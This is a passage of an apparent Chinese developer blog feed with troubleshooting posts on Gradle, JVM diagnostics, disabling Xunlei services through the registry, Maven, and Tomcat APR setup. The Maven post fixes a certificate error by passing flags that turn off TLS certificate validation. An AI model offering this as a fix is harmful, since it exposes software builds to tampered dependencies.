&lt;h3 id=&quot;zookeeper-单机安装配置&quot;&gt;&lt;a href=&quot;#zookeeper-单机安装配置&quot; class=&quot;headerlink&quot; title=&quot;zookeeper 单机安装配置&quot;&gt;&lt;/a&gt;zookeeper 单机安装配置&lt;</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="zookeeper" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/zookeeper/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>gradle工具整理</title>
    <link href="https://seniortesting.club/posts/kQQ2Y4m9In/"/>
    <id>https://seniortesting.club/posts/kQQ2Y4m9In/</id>
    <published>2021-03-26T12:53:09.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<p>gradle包管理工具</p><h2 id="gradle-离线下载"><a href="#gradle-离线下载" class="headerlink" title="gradle 离线下载"></a>gradle 离线下载</h2><p>gradle工程没有会找文件 gradle/wrapper/gradle-wrapper.properties 里面的相关配置，下载对应的gradle包从如下配置：<br><code>distributionUrl=https\://services.gradle.org/distributions/gradle-5.4.1-all.zip</code>, 所以每个gradle工程记得配置这个参数。<br>一次下载后后面就不会再下载了。记得配置<code>GRADLE_USER_HOME</code>环境变量。</p><h3 id="com-android-builder-internal-aapt-v2-Aapt2Exception-Android-resource-linking-failed"><a href="#com-android-builder-internal-aapt-v2-Aapt2Exception-Android-resource-linking-failed" class="headerlink" title="com.android.builder.internal.aapt.v2.Aapt2Exception: Android resource linking failed"></a>com.android.builder.internal.aapt.v2.Aapt2Exception: Android resource linking failed</h3><ol><li>在Android studio中打开toggle view进行查看详细的信息发现如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&gt; Task :capacitor-android:compileDebugJavaWithJavac FAILED</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\AndroidProtocolHandler.java:56: 错误: -source 1.6 中不支持 multi-catch 语句</span><br><span class="line">    &#125; catch (ClassNotFoundException | IllegalAccessException | NoSuchFieldException e) &#123;</span><br><span class="line">                                    ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 multi-catch 语句)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\Bridge.java:117: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">  private Map&lt;String, PluginHandle&gt; plugins &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">                                                          ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\Bridge.java:461: 错误: -source 1.6 中不支持 multi-catch 语句</span><br><span class="line">          &#125; catch(PluginLoadException | InvalidPluginMethodException | PluginInvocationException ex) &#123;</span><br><span class="line">                                      ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 multi-catch 语句)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\BridgeActivity.java:39: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">  private List&lt;Class&lt;? extends Plugin&gt;&gt; initialPlugins &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">                                                                       ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\JSArray.java:21: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">    List&lt;E&gt; items &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">                                  ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\JSObject.java:34: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">    List&lt;String&gt; keys &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">                                      ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\plugin\Filesystem.java:264: 错误: -source 1.6 中不支持 try-with-resources</span><br><span class="line">      try (BufferedWriter writer &#x3D; new BufferedWriter(new OutputStreamWriter(</span><br><span class="line">          ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 try-with-resources)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\plugin\Geolocation.java:40: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">  Map&lt;String, PluginCall&gt; watchingCalls &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">                                                      ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\plugin\notification\LocalNotification.java:110: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">    List&lt;LocalNotification&gt; resultLocalNotifications &#x3D; new ArrayList&lt;&gt;(notificationArray.length());</span><br><span class="line">                                                                     ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\plugin\notification\LocalNotificationAttachment.java:42: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">    List&lt;LocalNotificationAttachment&gt; attachmentsList &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">                                                                      ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\plugin\notification\NotificationAction.java:37: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">    Map&lt;String, NotificationAction[]&gt; actionTypeMap &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">                                                                  ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\plugin\notification\NotificationStorage.java:49: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">      return new ArrayList&lt;&gt;(all.keySet());</span><br><span class="line">                           ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\Plugin.java:53: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">    eventListeners &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">                                 ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\PluginCall.java:234: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">        List&lt;Object&gt; items &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">                                           ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\PluginHandle.java:17: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">  private Map&lt;String, PluginMethodHandle&gt; pluginMethods &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">                                                                      ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\PluginHandle.java:74: 错误: -source 1.6 中不支持 multi-catch 语句</span><br><span class="line">    &#125; catch(InstantiationException | IllegalAccessException ex) &#123;</span><br><span class="line">                                   ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 multi-catch 语句)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\util\HostMask.java:87: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">            List&lt;HostMask.Simple&gt; masks &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">                                                        ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">D:\GitRepository\yitieyilu.com\yanzhi-web\material-sharing\node_modules\@capacitor\android\capacitor\src\main\java\com\getcapacitor\WebViewLocalServer.java:96: 错误: -source 1.6 中不支持 diamond 运算符</span><br><span class="line">        tempResponseHeaders &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">                                          ^</span><br><span class="line">  (请使用 -source 7 或更高版本以启用 diamond 运算符)</span><br><span class="line">18 个错误</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>问题原因，没有正确配置gradle机器对应的Android sdk版本。<br>配置gradle环境变量：</p><ul><li>GRADLE_HOME =</li></ul><blockquote><p>gradle会下载相关需要依赖的jar包，默认的本地存放地址是：C:/Users/(用户名)/.gradle/caches/modules-2/files-2.1</p></blockquote><ul><li>GRADEL_USER_HOME = E:\GradleRepository (但是对于IDEA来说木有用（当然上面的环境变量还是要添加的），在IDEA中使用gradle需要修改Gradle的路径: Service Directory Path)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;gradle包管理工具&lt;/p&gt;
&lt;h2 id=&quot;gradle-离线下载&quot;&gt;&lt;a href=&quot;#gradle-离线下载&quot; class=&quot;headerlink&quot; title=&quot;gradle 离线下载&quot;&gt;&lt;/a&gt;gradle 离线下载&lt;/h2&gt;&lt;p&gt;gradle工程没有会找文件 </summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="maven" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/maven/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java内存占用过高问题分析</title>
    <link href="https://seniortesting.club/posts/GxGWU8kfyb/"/>
    <id>https://seniortesting.club/posts/GxGWU8kfyb/</id>
    <published>2021-03-26T12:50:03.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<p>java相关问题错误解决方案</p><h2 id="生产环境java内存占用很高排查-（尚未解决）"><a href="#生产环境java内存占用很高排查-（尚未解决）" class="headerlink" title="生产环境java内存占用很高排查 （尚未解决）"></a>生产环境java内存占用很高排查 （尚未解决）</h2><ul><li><p>命令<code>top</code>查看对应的java进程的<code>pid</code>,记录下该数值（16066）</p></li><li><p>定位线程问题（通过命令查看16066进程的线程情况），命令：<code>ps p 16066 -L -o pcpu,pmem,pid,tid,time,tname,cmd</code></p></li><li><p>输出堆栈信息,将PID为16066的堆栈信息打印到jstack.log中，命令：<code>jstack -l 16066 &gt; /logs/jvm/jstack.log</code></p></li></ul><blockquote><p>jvm运行时会生成一个目录hsperfdata_$USER($USER是启动java进程的用户)，在linux中默认是/tmp。目录下会有些pid文件，存放jvm进程信息。<br>jps、jstack等工具读取/tmp/hsperfdata_$USER下的pid文件获取连接信息。jstack报错：Unable to open socket file。是因为这个java进程的pid文件删除了。</p></blockquote><p>为什么会被删除呢？这是因为linux操作系统为了防止/tmp目录文件过多，有个删除管理机制：tmpwatch。</p><p>查看关键配置<code>/etc/cron.daily/tmpwatch</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flags=-umc /usr/sbin/tmpwatch &quot;$flags&quot; </span><br><span class="line">-x /tmp/.X11-unix -x /tmp/.XIM-unix \ </span><br><span class="line"> -x /tmp/.font-unix -x /tmp/.ICE-unix </span><br><span class="line">-x /tmp/.Test-unix 240 /tmp /usr/sbin/tmpwatch &quot;$flags&quot; 720 /var/tmp </span><br><span class="line">for d in /var/&#123;cache/man,catman&#125;/&#123;cat?,X11R6/cat?,local/cat?&#125;; </span><br><span class="line">do if [ -d &quot;$d&quot; ]; then /usr/sbin/tmpwatch &quot;$flags&quot; -f 720 &quot;$d&quot; fi done</span><br></pre></td></tr></table></figure><p>系统每天会用tmpwatch命令检查并删除 /tmp 下超过240小时未访问过的文件和目录。</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>修改tmpwatch设置<br>排查对应的/tmp/hsperfdata_*的目录，让jvm自己来管理，保证jps,jstat等命令可用。<br>修改<code>/etc/cron.daily/tmpwatch</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/tmpwatch <span class="string">&quot;<span class="variable">$flags</span>&quot;</span> -x /tmp/hsperfdata_* -x /tmp/.X11-unix -x /tmp/.XIM-unix</span><br><span class="line"> -x /tmp/.font-unix -x /tmp/.ICE-unix -x /tmp/.Test-unix 240 /tmp</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;java相关问题错误解决方案&lt;/p&gt;
&lt;h2 id=&quot;生产环境java内存占用很高排查-（尚未解决）&quot;&gt;&lt;a href=&quot;#生产环境java内存占用很高排查-（尚未解决）&quot; class=&quot;headerlink&quot; title=&quot;生产环境java内存占用很高排查 （尚未解决）&quot;</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="jvm系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/jvm%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>迅雷工具问题</title>
    <link href="https://seniortesting.club/posts/KMfNtMHX1G/"/>
    <id>https://seniortesting.club/posts/KMfNtMHX1G/</id>
    <published>2021-03-26T12:47:23.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<p>恶心的迅雷,充斥的都是广告.</p><h2 id="迅雷流氓后台程序禁用"><a href="#迅雷流氓后台程序禁用" class="headerlink" title="迅雷流氓后台程序禁用"></a>迅雷流氓后台程序禁用</h2><p>一直没有让win10干啥活儿，今儿个安装了个迅雷极速版，发现启动电脑进入桌面后有点卡顿。温Win7的故而知Win10的<br>新，过去的招儿今天一试，依然管用。拿来复习一下。</p><p>一、禁用XLServicePlatform服务(<del>已经不可用</del>)</p><p>打开：运行→键入SERVICES.MSC→鼠标双击XLServicePlatform→运行改成：停止→启动改成：禁用→点击：应用，OK<br>；</p><p>二、修改注册表</p><p>仅在【服务】里头【关闭】、【禁用】XLServicePlatform服务没用，重启电脑它会自己改回来的。<br>打开：运行→键入regedit；找到并打开下面这个子项：<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services<br>将里面的下列子项的值进行修改<br>XLGuard  将start的值修改为4<br>XLServicePlatform  将start的值修改为3<br>XLWFP  将start的值修改为4</p><p>三、禁用服务</p><p>打开注册表，定位到“HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XLservicePlatform”，<br>在“XLservicePlatform”右侧选中所有数值，然后删除！删除后服务里迅雷的服务已经消失，现在需要修改权限避免迅雷修改注册表。<br>选中XLservicePlatform项，右键选择权限，高级权限，更改所有者，将所有者改为超级管理员Administrators，然后禁用继承，<br>点确定，如果无法禁用继承，就对每个帐户选用权限拒绝即可！这样迅雷启动时就无法修改注册表达到自动启动服务的目的了，因为权限被我们禁用！</p><p>重新启动电脑，OK了</p><ul><li>脚本如下，保存为<code>.reg</code>格式即可:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XLGuard]</span><br><span class="line">&quot;Start&quot;&#x3D;dword:00000004</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XLServicePlatform]</span><br><span class="line">&quot;Type&quot;&#x3D;dword:00000010</span><br><span class="line">&quot;Start&quot;&#x3D;dword:00000003</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XLWFP]</span><br><span class="line">&quot;Type&quot;&#x3D;dword:00000001</span><br><span class="line">&quot;Start&quot;&#x3D;dword:00000004</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;恶心的迅雷,充斥的都是广告.&lt;/p&gt;
&lt;h2 id=&quot;迅雷流氓后台程序禁用&quot;&gt;&lt;a href=&quot;#迅雷流氓后台程序禁用&quot; class=&quot;headerlink&quot; title=&quot;迅雷流氓后台程序禁用&quot;&gt;&lt;/a&gt;迅雷流氓后台程序禁用&lt;/h2&gt;&lt;p&gt;一直没有让win10干啥活儿，今</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>IDEA maven问题整理</title>
    <link href="https://seniortesting.club/posts/mbgAG3oBtK/"/>
    <id>https://seniortesting.club/posts/mbgAG3oBtK/</id>
    <published>2021-03-26T12:44:19.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IDEA-maven安装包报错-unable-to-find-valid-certification-path-to-requested-target"><a href="#IDEA-maven安装包报错-unable-to-find-valid-certification-path-to-requested-target" class="headerlink" title="IDEA maven安装包报错 unable to find valid certification path to requested target"></a>IDEA maven安装包报错 unable to find valid certification path to requested target</h2><p>报错信息:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Could not transfer artifact org.apache.maven.plugins:maven-install-plugin:pom:2.4 from/to alimaven (https://maven.aliyun.com/repository/central): sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target</span><br></pre></td></tr></table></figure><p>解决方法, 添加参数 <code>-Dmaven.wagon.http.ssl.insecure=true -Dmaven.wagon.http.ssl.allowall=true</code></p><p><img src="https://img2018.cnblogs.com/i-beta/1391561/201912/1391561-20191224125111091-1607460807.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;IDEA-maven安装包报错-unable-to-find-valid-certification-path-to-requested-target&quot;&gt;&lt;a href=&quot;#IDEA-maven安装包报错-unable-to-find-valid-certific</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="maven" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/maven/"/>
    
    
  </entry>
  
  <entry>
    <title>Tomcat Linux安装及其环境配置</title>
    <link href="https://seniortesting.club/posts/WE8HpfEOO1/"/>
    <id>https://seniortesting.club/posts/WE8HpfEOO1/</id>
    <published>2021-03-26T12:44:19.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="apr安装配置"><a href="#apr安装配置" class="headerlink" title="apr安装配置"></a>apr安装配置</h2><h3 id="1-windows环境配置"><a href="#1-windows环境配置" class="headerlink" title="1. windows环境配置"></a>1. windows环境配置</h3><p>如果springboot开启apr模式后报错如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Caused by: org.apache.catalina.LifecycleException: The configured protocol [org.apache.coyote.http11.Http11AprProtocol] <span class="keyword">requires</span> the APR/<span class="keyword">native</span> library which is not available</span><br></pre></td></tr></table></figure><p>则需要在classpath中添加<code>tcnative-1.dll</code>文件，该文件存在tomcat的安装包中的<code>bin</code>目录下面也可以单独下载<code>tomcat-native</code>(<a href="http://archive.apache.org/dist/tomcat/tomcat-connectors/native/)%E5%8C%85%EF%BC%8C%E6%8E%A8%E8%8D%90%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E5%BC%8F%E4%B8%8B%E8%BD%BDtomcat" target="_blank" rel="noopener">http://archive.apache.org/dist/tomcat/tomcat-connectors/native/)包，推荐第一种方式下载tomcat</a>安装包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;mirrors.gigenet.com&#x2F;apache&#x2F;tomcat&#x2F;tomcat-9&#x2F;v9.0.36&#x2F;bin&#x2F;apache-tomcat-9.0.36-windows-x64.zip</span><br><span class="line">$ tar zxvf apache-tomcat-9.0.36-windows-x64.zip</span><br><span class="line">$ cd apache-tomcat-9.0.36-windows-x64&#x2F;bin</span><br><span class="line"># 复制tcnative-1.dll到jdk的bin目录下，重启项目即可。</span><br></pre></td></tr></table></figure><h3 id="2-Linux环境配置"><a href="#2-Linux环境配置" class="headerlink" title="2. Linux环境配置"></a>2. Linux环境配置</h3><ul><li>2.1 下载资源</li></ul><ol><li>进入apr地址: <a href="http://apr.apache.org/download.cgi" target="_blank" rel="noopener">http://apr.apache.org/download.cgi</a>,里面有三个包： apr, apr-util,apr-iconv,把这三个包都安装了。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir apr</span><br><span class="line">$ wget https:&#x2F;&#x2F;mirrors.ocf.berkeley.edu&#x2F;apache&#x2F;&#x2F;apr&#x2F;apr-1.7.0.tar.gz</span><br><span class="line">$ wget https:&#x2F;&#x2F;mirrors.ocf.berkeley.edu&#x2F;apache&#x2F;&#x2F;apr&#x2F;apr-util-1.6.1.tar.gz</span><br><span class="line">$ wget https:&#x2F;&#x2F;mirrors.ocf.berkeley.edu&#x2F;apache&#x2F;&#x2F;apr&#x2F;apr-iconv-1.2.2.tar.gz</span><br><span class="line">#获取运行tomcat（无论内置还是外置，对应tomcat版本下的&#x2F;bin&#x2F;tomcat-native.tar.gz文件 ）</span><br><span class="line">$ wget https:&#x2F;&#x2F;apache.osuosl.org&#x2F;tomcat&#x2F;tomcat-9&#x2F;v9.0.36&#x2F;bin&#x2F;apache-tomcat-9.0.36.tar.gz</span><br><span class="line"></span><br><span class="line">$ tar zxvf apr-1.7.0.tar.gz</span><br><span class="line">$ tar zxvf apr-util-1.6.1.tar.gz</span><br><span class="line">$ tar zxvf apr-iconv-1.2.2.tar.gz</span><br><span class="line"></span><br><span class="line">$ tar zxvf apache-tomcat-9.0.36.tar.gz</span><br><span class="line">$ cd apache-tomcat-9.0.36&#x2F;bin</span><br><span class="line">$ tar zxvf tomcat-native.tar.gz</span><br></pre></td></tr></table></figure><ul><li>2.2 安装APR</li></ul><figure class="highlight shell"><table><tr><td 